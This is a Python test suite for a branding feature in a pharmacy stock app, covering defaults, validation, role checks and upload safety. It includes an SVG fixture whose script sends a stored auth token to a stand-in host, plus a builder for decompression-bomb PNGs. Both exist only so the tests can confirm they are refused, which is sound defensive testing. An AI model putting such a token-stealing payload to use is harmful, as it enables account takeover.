"""White-label branding: storage, the public document, and the upload guard.

Three invariants outrank every status code here:

1. **An unconfigured install renders exactly as it did before this feature.**
   Every field falls back to the string the UI hardcoded, so the defaults are
   asserted literally — a typo'd default is a silently renamed product.

2. **`GET /brand` never 500s.** It is on the hot path of every login-screen
   render and needs no token, so a Postgres blip here blanks the sign-in page of
   a deployment whose database is otherwise fine — and nobody can sign in to fix
   it. ``test_brand_never_500s_on_a_db_error`` monkeypatches the query to raise
   and still expects 200 + defaults.

3. **SVG is refused, and refused on MAGIC BYTES.** These files are served from
   `/brand/asset/{key}` on the same origin as the admin console, whose bearer
   token lives in `localStorage`, so a stored SVG is stored XSS against a
   super_admin. The refusal is asserted twice: once for an honest `.svg`, and
   once for the same bytes wearing a `.png` filename and an `image/png`
   Content-Type — the second is the test that fails if anyone "simplifies" the
   check into an extension check. Verified non-vacuously: reverting
   ``validate_image`` to trust the filename makes exactly that case fail.

Fixtures follow ``tests/test_security_config.py`` — real rows through a private
asyncpg connection, super_admin vs plain admin, cleanup that runs on the way IN
as well as out.

⚠️ Every DB setup/teardown goes through :func:`_pg`, a throwaway asyncpg
connection — NOT ``app.db.q``. The shared pool is bound to whichever loop
created it, and under ``api_client`` that is the TestClient's portal loop.
"""

from __future__ import annotations

import asyncio
import os
import uuid
import zlib

import pytest

from app import auth as authmod
from app import brand as brandmod
from app.config import get_settings

from tests.pgconn import pg
from tests import dbguard


def _pg(query: str, *args, fetch: bool = False):
    """Run one statement on a private connection. Never touches app.db's pool.

    One connection per PROCESS, not per statement — see tests/pgconn.py for why
    the previous arrangement was the suite's whole wall clock.
    """

    return pg(query, *args, fetch=fetch)


def _ensure_brand_schema():
    """The tables, without importing the app's pool. Mirrors the migration."""

    _pg(
        """CREATE TABLE IF NOT EXISTS brand_config (
               id         INT PRIMARY KEY DEFAULT 1 CHECK (id = 1),
               data       JSONB NOT NULL DEFAULT '{}'::jsonb,
               updated_at TIMESTAMPTZ DEFAULT now()
           )"""
    )
    _pg(
        """CREATE TABLE IF NOT EXISTS brand_assets (
               key        TEXT PRIMARY KEY,
               mime       TEXT NOT NULL,
               bytes      BYTEA NOT NULL,
               sha256     TEXT NOT NULL,
               width      INT,
               height     INT,
               size_bytes INT,
               updated_at TIMESTAMPTZ DEFAULT now()
           )"""
    )


@pytest.fixture(autouse=True)
def _clean_branding():
    """No overrides and no assets before AND after every test in this module.

    Cleaning only in a `finally` is not enough — a killed run never reaches it,
    and a leaked override is not a local failure: the next test file that renders
    anything branded inherits somebody else's product name, and the suite starts
    failing somewhere that has nothing to do with branding.
    """

    # These two DELETEs are UNQUALIFIED, and they used to run against the DSN
    # the running stack serves from: `pytest` erased the deployed CityCare and
    # CMHL logos, twice, and they had to be re-uploaded by hand. conftest now
    # redirects POSTGRES_URL to a clone of the live database and dbguard patches
    # asyncpg so nothing else is reachable — but the assert stays here too,
    # where a reader of `DELETE FROM brand_assets` can see it on the line above
    # rather than having to trust a patch installed in another file.
    dbguard.assert_test_database()

    _ensure_brand_schema()
    _pg("DELETE FROM brand_assets")
    _pg("DELETE FROM brand_config")
    yield
    dbguard.assert_test_database()
    _pg("DELETE FROM brand_assets")
    _pg("DELETE FROM brand_config")


class _Admin:
    """An approved account + a bearer header. Mirrors test_security_config."""

    def __init__(self, role="admin"):
        _pg("ALTER TABLE users ADD COLUMN IF NOT EXISTS store_id TEXT")
        self.email = f"brand-{uuid.uuid4().hex[:10]}@corp.mm"
        rows = _pg(
            """INSERT INTO users (email, name, role, auth_sources, active, approved)
               VALUES ($1,'BrandProbe',$2,ARRAY['local'],TRUE,TRUE)
               RETURNING id, email, role""",
            self.email, role, fetch=True,
        )
        self.id = rows[0]["id"]
        self.token = authmod.make_token(rows[0])["token"]
        self.headers = {"Authorization": f"Bearer {self.token}"}

    def drop(self):
        _pg("DELETE FROM users WHERE id=$1", self.id)


@pytest.fixture
def admin():
    a = _Admin(role="admin")
    yield a
    a.drop()


@pytest.fixture
def super_admin():
    a = _Admin(role="super_admin")
    yield a
    a.drop()


# ---- image builders --------------------------------------------------------
#
# Built by hand rather than with Pillow: Pillow is deliberately NOT a dependency
# of this repo (see the note above `/branding` in app/admin.py), and a test that
# needed it would quietly argue for adding it.


def _chunk(ctype: bytes, data: bytes) -> bytes:
    return (
        len(data).to_bytes(4, "big")
        + ctype
        + data
        + zlib.crc32(ctype + data).to_bytes(4, "big")
    )


def _png(width: int = 8, height: int = 8, noise: bool = False) -> bytes:
    """A genuinely valid greyscale PNG of the requested size."""

    ihdr = (
        width.to_bytes(4, "big")
        + height.to_bytes(4, "big")
        + bytes([8, 0, 0, 0, 0])      # 8-bit greyscale, no interlace
    )
    # A fresh random row per scanline, not one row repeated: repeating it
    # compresses to nothing and the "oversized" fixture comes out at 10 KB.
    make_row = os.urandom if noise else bytes
    raw = b"".join(b"\x00" + make_row(width) for _ in range(height))
    return (
        b"\x89PNG\r\n\x1a\n"
        + _chunk(b"IHDR", ihdr)
        + _chunk(b"IDAT", zlib.compress(raw, 1 if noise else 9))
        + _chunk(b"IEND", b"")
    )


def _png_claiming(width: int, height: int) -> bytes:
    """A tiny PNG whose IHDR LIES about its size — the decompression bomb.

    The CRC is recomputed, so the only thing wrong with this file is the
    dimension claim. It is ~100 bytes on the wire and would allocate gigabytes
    if anything decoded it to find out how big it was, which is the reason the
    size check reads the header instead.
    """

    real = _png(4, 4)
    ihdr = width.to_bytes(4, "big") + height.to_bytes(4, "big") + real[24:29]
    return real[:8] + _chunk(b"IHDR", ihdr) + real[33:]


SVG_BODY = (
    b'<svg xmlns="http://www.w3.org/2000/svg" width="64" height="64">'
    b'<script>fetch("//evil.example/"+localStorage.auth_token)</script>'
    b"</svg>"
)


def _upload(client, key, headers, body, filename="logo.png", mime="image/png"):
    return client.post(
        f"/admin/branding/asset/{key}",
        headers=headers,
        files={"file": (filename, body, mime)},
    )


# ---- 1. defaults -----------------------------------------------------------


def test_unconfigured_install_returns_the_hardcoded_strings(api_client):
    """The defaults ARE the old UI's literals. A typo here renames the product."""

    body = api_client.get("/brand").json()
    assert body["product_name"] == "City Pharma"
    assert body["short_name"] == "City Pharma"
    assert body["tagline"] == "Stock Intelligence"
    assert body["console_subtitle"] == "Admin console"
    assert body["login_promise"] == (
        "Ask about stock in plain words — English or Burmese. Read-only by design."
    )
    assert body["legal_footer"] == "© 2026 City Medical Health & Logistics · Read-only"
    assert body["pending_title"] == "CMHL Secure Platform"
    assert body["parent_name"] == "CMHL"
    assert body["dark_logo_mode"] == "chip"
    assert body["assets"] == {
        "icon": None, "lockup": None, "lockup_dark": None, "parent": None,
    }


def test_brand_never_500s_on_a_db_error(api_client, monkeypatch):
    """A Postgres blip must not blank the login screen of every user.

    `/brand` needs no token because the sign-in page renders before one exists;
    if it could 500, a database hiccup would leave nobody able to sign in and
    fix it. Defaults are the correct degraded state — they are how the product
    looked before this table existed.
    """

    async def boom(*_a, **_kw):
        raise RuntimeError("connection refused")

    monkeypatch.setattr(brandmod, "q", boom)
    r = api_client.get("/brand")
    assert r.status_code == 200, r.text
    body = r.json()
    assert body["version"] == "default"
    assert body["product_name"] == "City Pharma"


def test_a_hand_edited_dark_logo_mode_is_clamped_on_READ(api_client):
    """Validation on write is not enough — psql can reach this row.

    `dark_logo_mode` selects a rendering branch, so an unknown value is a branch
    that does not exist. It is refused on write AND clamped on read.
    """

    _pg(
        """INSERT INTO brand_config (id, data) VALUES (1, $1::jsonb)
           ON CONFLICT (id) DO UPDATE SET data = EXCLUDED.data""",
        '{"dark_logo_mode": "rainbow", "product_name": "Kept"}',
    )
    body = api_client.get("/brand").json()
    assert body["dark_logo_mode"] == "chip"     # clamped
    assert body["product_name"] == "Kept"       # the valid sibling survives


# ---- 2. text updates + validation ------------------------------------------


def test_put_updates_text_and_shows_in_the_public_document(api_client, super_admin):
    r = api_client.put(
        "/admin/branding",
        headers=super_admin.headers,
        json={"product_name": "Zaw Pharma", "tagline": "Every branch, live"},
    )
    assert r.status_code == 200, r.text
    assert r.json()["product_name"] == "Zaw Pharma"

    public = api_client.get("/brand").json()
    assert public["product_name"] == "Zaw Pharma"
    assert public["tagline"] == "Every branch, live"
    # Untouched fields still fall back.
    assert public["parent_name"] == "CMHL"


def test_put_is_partial_and_does_not_clear_the_other_fields(api_client, super_admin):
    api_client.put("/admin/branding", headers=super_admin.headers,
                   json={"product_name": "One"})
    api_client.put("/admin/branding", headers=super_admin.headers,
                   json={"tagline": "Two"})
    body = api_client.get("/brand").json()
    assert (body["product_name"], body["tagline"]) == ("One", "Two")


@pytest.mark.parametrize(
    "payload",
    [
        {"product_name": "x" * 25},                     # cap is 24
        {"short_name": "x" * 13},                       # cap is 12
        {"tagline": "y" * 201},                         # general cap is 200
        {"product_name": 42},                           # not a string
        {"product_name": None},
        {"product_name": True},                         # bool is an int subclass
        {"product_name": ["City"]},
        {"product_name": "   "},                        # empty once trimmed
        {"dark_logo_mode": "rainbow"},                  # not one of the two
        {"dark_logo_mode": "CHIP"},                     # literal, not case-folded
        {"nonsense": "x"},                              # unknown field
        {},                                             # nothing to update
    ],
)
def test_put_validation_rejects(api_client, super_admin, payload):
    r = api_client.put("/admin/branding", headers=super_admin.headers, json=payload)
    assert r.status_code == 400, r.text


def test_put_accepts_both_dark_logo_modes(api_client, super_admin):
    for mode in ("chip", "variant"):
        r = api_client.put("/admin/branding", headers=super_admin.headers,
                           json={"dark_logo_mode": mode})
        assert r.status_code == 200, r.text
        assert api_client.get("/brand").json()["dark_logo_mode"] == mode


def test_control_characters_are_stripped_not_stored(api_client, super_admin):
    """A newline splits a heading; U+202E reverses the rendered name invisibly."""

    api_client.put("/admin/branding", headers=super_admin.headers,
                   json={"product_name": "City‮Pharma\n"})
    assert api_client.get("/brand").json()["product_name"] == "CityPharma"


def test_admin_document_marks_defaults_vs_overrides(api_client, super_admin):
    body = api_client.get("/admin/branding", headers=super_admin.headers).json()
    assert body["is_default"]["product_name"] is True

    api_client.put("/admin/branding", headers=super_admin.headers,
                   json={"product_name": "Zaw Pharma"})
    body = api_client.get("/admin/branding", headers=super_admin.headers).json()
    assert body["is_default"]["product_name"] is False
    assert "product_name" in body["overridden"]
    assert body["is_default"]["tagline"] is True
    assert body["defaults"]["product_name"] == "City Pharma"


# ---- 3. upload validation — the security-critical half ---------------------


def test_an_svg_upload_is_refused(api_client, super_admin):
    """An honest SVG. It is scriptable XML served same-origin with the console."""

    r = _upload(api_client, "icon", super_admin.headers, SVG_BODY,
                filename="logo.svg", mime="image/svg+xml")
    assert r.status_code == 400, r.text
    assert "svg" in r.text.lower()
    assert api_client.get("/brand").json()["assets"]["icon"] is None


def test_an_svg_wearing_a_png_filename_is_refused(api_client, super_admin):
    """THE test. Filename and Content-Type are both chosen by the uploader.

    If this passes while the previous one fails, the check has been rewritten as
    an extension check and the stored-XSS hole is open again.
    """

    r = _upload(api_client, "icon", super_admin.headers, SVG_BODY,
                filename="logo.png", mime="image/png")
    assert r.status_code == 400, r.text
    assert api_client.get("/brand").json()["assets"]["icon"] is None
    assert _pg("SELECT count(*) AS n FROM brand_assets", fetch=True)[0]["n"] == 0


def test_a_png_lying_about_its_dimensions_is_refused(api_client, super_admin):
    """~100 bytes claiming 60000×60000. Refused from the header, never decoded."""

    r = _upload(api_client, "icon", super_admin.headers, _png_claiming(60000, 60000))
    assert r.status_code == 400, r.text
    assert "60000" in r.text


def test_a_zero_dimension_is_refused(api_client, super_admin):
    r = _upload(api_client, "icon", super_admin.headers, _png_claiming(0, 8))
    assert r.status_code == 400, r.text


def test_an_oversized_body_is_refused(api_client, super_admin):
    """Incompressible 1024×1024 noise — a real PNG, just past the 1 MB cap."""

    body = _png(1024, 1024, noise=True)
    assert len(body) > brandmod.MAX_ASSET_BYTES
    r = _upload(api_client, "icon", super_admin.headers, body)
    assert r.status_code == 413, r.text
    assert api_client.get("/brand").json()["assets"]["icon"] is None


def test_a_payload_appended_after_iend_is_refused(api_client, super_admin):
    """Nothing re-encodes the bytes (no Pillow), so the tail check is the guard.

    A valid PNG with a blob glued on stays a valid PNG to every decoder, while
    the bytes we hand back to a browser are attacker-chosen.
    """

    r = _upload(api_client, "icon", super_admin.headers, _png() + SVG_BODY)
    assert r.status_code == 400, r.text


def test_a_truncated_png_is_refused(api_client, super_admin):
    r = _upload(api_client, "icon", super_admin.headers, _png()[:20])
    assert r.status_code == 400, r.text


def test_an_unknown_asset_key_is_404(api_client, super_admin):
    r = _upload(api_client, "favicon", super_admin.headers, _png())
    assert r.status_code == 404, r.text


# ---- 4. a valid asset round-trips ------------------------------------------


def test_a_valid_png_round_trips(api_client, super_admin):
    body = _png(64, 64)
    r = _upload(api_client, "lockup", super_admin.headers, body)
    assert r.status_code == 200, r.text

    meta = r.json()["asset_meta"]["lockup"]
    assert meta["mime"] == "image/png"
    assert (meta["width"], meta["height"]) == (64, 64)
    assert meta["size_bytes"] == len(body)

    import hashlib

    digest = hashlib.sha256(body).hexdigest()
    url = api_client.get("/brand").json()["assets"]["lockup"]
    assert url is not None
    assert digest in url, url        # the cache-busting value IS the content hash

    got = api_client.get(url)
    assert got.status_code == 200
    assert got.content == body
    assert got.headers["content-type"] == "image/png"
    assert got.headers["x-content-type-options"] == "nosniff"
    assert got.headers["cache-control"] == "public, max-age=31536000, immutable"
    assert got.headers["content-disposition"] == 'inline; filename="lockup.png"'


def test_an_unset_asset_is_404(api_client):
    assert api_client.get("/brand/asset/icon").status_code == 404


def test_replacing_an_asset_changes_version_and_the_url(api_client, super_admin):
    """Cache-busting has to actually work.

    `Cache-Control: immutable` for a year is only safe because the URL carries
    the content hash. If `version` (or the URL) failed to move on a replacement,
    every browser that had ever loaded the old logo would keep painting it —
    indefinitely, and unfixably from the console.
    """

    _upload(api_client, "icon", super_admin.headers, _png(16, 16))
    first = api_client.get("/brand").json()

    _upload(api_client, "icon", super_admin.headers, _png(32, 32))
    second = api_client.get("/brand").json()

    assert first["version"] != second["version"]
    assert first["assets"]["icon"] != second["assets"]["icon"]
    assert api_client.get(second["assets"]["icon"]).status_code == 200


def test_version_also_moves_on_a_text_change(api_client, super_admin):
    before = api_client.get("/brand").json()["version"]
    api_client.put("/admin/branding", headers=super_admin.headers,
                   json={"product_name": "Zaw Pharma"})
    assert api_client.get("/brand").json()["version"] != before


# ---- 5. delete + reset ------------------------------------------------------


def test_delete_asset_restores_the_fallback(api_client, super_admin):
    _upload(api_client, "icon", super_admin.headers, _png())
    assert api_client.get("/brand").json()["assets"]["icon"] is not None

    r = api_client.delete("/admin/branding/asset/icon", headers=super_admin.headers)
    assert r.status_code == 200, r.text
    assert api_client.get("/brand").json()["assets"]["icon"] is None
    assert api_client.get("/brand/asset/icon").status_code == 404


def test_reset_restores_every_default(api_client, super_admin):
    api_client.put("/admin/branding", headers=super_admin.headers,
                   json={"product_name": "Zaw Pharma", "parent_name": "ZPG"})
    _upload(api_client, "icon", super_admin.headers, _png())
    _upload(api_client, "parent", super_admin.headers, _png())

    r = api_client.post("/admin/branding/reset", headers=super_admin.headers)
    assert r.status_code == 200, r.text

    body = api_client.get("/brand").json()
    assert body["product_name"] == "City Pharma"
    assert body["parent_name"] == "CMHL"
    assert body["assets"] == {
        "icon": None, "lockup": None, "lockup_dark": None, "parent": None,
    }
    assert body["version"] == api_client.get("/brand").json()["version"]


# ---- 6. who may call what ---------------------------------------------------


def test_every_branding_write_is_super_admin_only(api_client, admin):
    """Branding renames the product on every user's login screen — not a
    per-branch preference, so a plain admin gets 403 on all five."""

    assert api_client.get(
        "/admin/branding", headers=admin.headers).status_code == 403
    assert api_client.put(
        "/admin/branding", headers=admin.headers,
        json={"product_name": "Nope"}).status_code == 403
    assert _upload(api_client, "icon", admin.headers, _png()).status_code == 403
    assert api_client.delete(
        "/admin/branding/asset/icon", headers=admin.headers).status_code == 403
    assert api_client.post(
        "/admin/branding/reset", headers=admin.headers).status_code == 403


def test_branding_writes_reject_an_anonymous_caller(api_client):
    assert api_client.get("/admin/branding").status_code in (401, 403)
    assert api_client.post("/admin/branding/reset").status_code in (401, 403)


def test_the_public_routes_need_no_token(api_client, super_admin):
    """Same posture as `/auth/config`: the login screen renders before a token."""

    assert api_client.get("/brand").status_code == 200
    _upload(api_client, "icon", super_admin.headers, _png())
    url = api_client.get("/brand").json()["assets"]["icon"]
    assert api_client.get(url).status_code == 200
